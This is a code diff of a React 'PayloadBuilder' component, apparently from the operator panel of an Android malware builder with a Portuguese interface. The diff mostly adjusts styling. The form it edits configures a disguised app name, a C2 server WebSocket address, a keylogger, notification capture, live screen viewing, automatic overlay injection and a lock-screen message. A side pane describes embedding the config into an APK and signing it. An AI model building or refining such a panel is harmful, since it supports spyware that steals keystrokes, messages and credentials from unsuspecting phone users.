@@ -56,22 +56,22 @@ export const PayloadBuilder: React.FC = () => {
   };
 
   return (
-    <div style={{ display: 'grid', gridTemplateColumns: '1fr 320px', gap: '24px', padding: '24px' }}>
+    <div className="builder-grid-container" style={{ display: 'grid', gridTemplateColumns: '1fr 300px', gap: '20px', padding: '16px' }}>
       
       {/* Configuration Form */}
       <div className="glass-panel" style={{ padding: '20px' }}>
-        <h2 style={{ fontSize: '22px', fontWeight: '600', marginBottom: '16px', color: 'var(--text-primary)' }} className="title-glow">
+        <h2 style={{ fontSize: '20px', fontWeight: '600', marginBottom: '10px', color: 'var(--text-primary)' }} className="title-glow">
           Gerador de Payload (Compilador)
         </h2>
-        <p style={{ color: 'var(--text-secondary)', marginBottom: '20px', fontSize: '14px' }}>
+        <p style={{ color: 'var(--text-secondary)', marginBottom: '16px', fontSize: '13px' }}>
           Personalize as configurações do arquivo options.json e os metadados do aplicativo a ser instalado.
         </p>
 
-        <form onSubmit={handleBuild} style={{ display: 'flex', flexDirection: 'column', gap: '16px' }}>
+        <form onSubmit={handleBuild} style={{ display: 'flex', flexDirection: 'column', gap: '14px' }}>
           
-          <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-              <label style={{ fontSize: '13px', fontWeight: '500', color: 'var(--text-secondary)' }}>Nome do App Disfarçado</label>
+          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+              <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Nome do App Disfarçado</label>
               <input 
                 type="text" 
                 value={appName} 
@@ -79,8 +79,8 @@ export const PayloadBuilder: React.FC = () => {
                 required
               />
             </div>
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-              <label style={{ fontSize: '13px', fontWeight: '500', color: 'var(--text-secondary)' }}>Nome do Pacote (Package Name)</label>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+              <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Nome do Pacote (Package)</label>
               <input 
                 type="text" 
                 value={packageName} 
@@ -90,8 +90,8 @@ export const PayloadBuilder: React.FC = () => {
             </div>
           </div>
 
-          <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-            <label style={{ fontSize: '13px', fontWeight: '500', color: 'var(--text-secondary)' }}>Endereço C2 Server (Porta WebSocket)</label>
+          <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+            <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Endereço C2 Server (Porta WebSocket)</label>
             <input 
               type="text" 
               value={c2Url} 
@@ -100,80 +100,75 @@ export const PayloadBuilder: React.FC = () => {
             />
           </div>
 
-          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
-            <h4 style={{ fontSize: '14px', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '12px' }}>
+          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '12px' }}>
+            <h4 style={{ fontSize: '13px', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '10px' }}>
               Opções do Bot (options.json)
             </h4>
             
-            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
-              <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', cursor: 'pointer' }}>
+            <div style={{ display: 'flex', flexDirection: 'column', gap: '8px' }}>
+              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                 <input 
                   type="checkbox" 
                   checked={keystrokes} 
                   onChange={(e) => setKeystrokes(e.target.checked)} 
-                  style={{ transform: 'scale(1.1)' }}
                 />
                 Capturar Digitação (Keylogger)
               </label>
 
-              <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', cursor: 'pointer' }}>
+              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                 <input 
                   type="checkbox" 
                   checked={notifications} 
                   onChange={(e) => setNotifications(e.target.checked)} 
-                  style={{ transform: 'scale(1.1)' }}
                 />
                 Capturar Notificações Push
               </label>
 
-              <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', cursor: 'pointer' }}>
+              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                 <input 
                   type="checkbox" 
                   checked={livenotify} 
                   onChange={(e) => setLivenotify(e.target.checked)} 
-                  style={{ transform: 'scale(1.1)' }}
                 />
                 Notificações em Tempo Real (livenotify)
               </label>
 
-              <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', cursor: 'pointer' }}>
+              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                 <input 
                   type="checkbox" 
                   checked={livescreen} 
                   onChange={(e) => setLivescreen(e.target.checked)} 
-                  style={{ transform: 'scale(1.1)' }}
                 />
                 Live Screen ativa por padrão
               </label>
 
-              <label style={{ display: 'flex', alignItems: 'center', gap: '10px', fontSize: '13px', cursor: 'pointer' }}>
+              <label style={{ display: 'flex', alignItems: 'center', gap: '8px', fontSize: '12px', cursor: 'pointer' }}>
                 <input 
                   type="checkbox" 
                   checked={autoj} 
                   onChange={(e) => setAutoj(e.target.checked)} 
-                  style={{ transform: 'scale(1.1)' }}
                 />
                 Injeção automática de overlays (autoj)
               </label>
             </div>
           </div>
 
-          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '16px' }}>
-            <h4 style={{ fontSize: '14px', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '12px' }}>
+          <div style={{ borderTop: '1px solid var(--border-color)', paddingTop: '12px' }}>
+            <h4 style={{ fontSize: '13px', fontWeight: '600', color: 'var(--text-primary)', marginBottom: '10px' }}>
               Configurações da Tela de Bloqueio
             </h4>
             
-            <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '16px' }}>
-              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                <label style={{ fontSize: '13px', fontWeight: '500', color: 'var(--text-secondary)' }}>Título do Alerta</label>
+            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: '12px' }}>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Título do Alerta</label>
                 <input 
                   type="text" 
                   value={lockTitle} 
                   onChange={(e) => setLockTitle(e.target.value)} 
                 />
               </div>
-              <div style={{ display: 'flex', flexDirection: 'column', gap: '6px' }}>
-                <label style={{ fontSize: '13px', fontWeight: '500', color: 'var(--text-secondary)' }}>Mensagem de Bloqueio</label>
+              <div style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
+                <label style={{ fontSize: '12px', fontWeight: '500', color: 'var(--text-secondary)' }}>Mensagem de Bloqueio</label>
                 <input 
                   type="text" 
                   value={lockMsg} 
@@ -183,31 +178,31 @@ export const PayloadBuilder: React.FC = () => {
             </div>
           </div>
 
-          <button type="submit" className="btn btn-primary" style={{ padding: '12px', marginTop: '10px' }}>
+          <button type="submit" className="btn btn-primary" style={{ padding: '10px', marginTop: '8px', fontSize: '13px', minHeight: '38px' }}>
             ⚙️ Compilar e Baixar Configurações
           </button>
         </form>
       </div>
 
       {/* Compiler Information Pane */}
-      <div className="glass-panel" style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: '16px' }}>
-        <h3 style={{ fontSize: '18px', fontWeight: '600' }}>Processo do Compilador</h3>
+      <div className="glass-panel" style={{ padding: '16px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
+        <h3 style={{ fontSize: '16px', fontWeight: '600' }}>Processo do Compilador</h3>
         
-        <div style={{ display: 'flex', flexDirection: 'column', gap: '12px', fontSize: '13px' }}>
+        <div style={{ display: 'flex', flexDirection: 'column', gap: '10px', fontSize: '12px' }}>
           <p style={{ color: 'var(--text-secondary)' }}>
             O painel web gera a assinatura e opções JSON para o agente. Para embutir no APK:
           </p>
-          <ol style={{ paddingLeft: '20px', display: 'flex', flexDirection: 'column', gap: '8px', color: 'var(--text-secondary)' }}>
+          <ol style={{ paddingLeft: '16px', display: 'flex', flexDirection: 'column', gap: '6px', color: 'var(--text-secondary)' }}>
             <li>Insira as chaves geradas no diretório assets do builder.</li>
             <li>Execute a ferramenta de recompilação do APK.</li>
             <li>Assine o aplicativo final usando a chave do projeto.</li>
           </ol>
 
           <div style={{ 
-            marginTop: '12px', 
+            marginTop: '8px', 
             background: 'var(--bg-primary)', 
             border: '1px solid var(--border-color)', 
-            padding: '12px', 
+            padding: '10px', 
             borderRadius: '6px', 
             fontFamily: 'var(--font-mono)',
             fontSize: '11px',
@@ -216,12 +211,18 @@ export const PayloadBuilder: React.FC = () => {
             # Terminal do Compilador&#10;
             [STATUS] Pronto para compilação.&#10;
             [CONFIG] App: {appName.substring(0, 15)}...&#10;
-            [CONFIG] Servidor: {c2Url.substring(0, 18)}...&#10;
             [BUILD] Use a chave gerada para assinar o apk final.
           </div>
         </div>
       </div>
 
+      <style>{`
+        @media (max-width: 1024px) {
+          .builder-grid-container {
+            grid-template-columns: 1fr !important;
+          }
+        }
+      `}</style>
     </div>
   );
 };
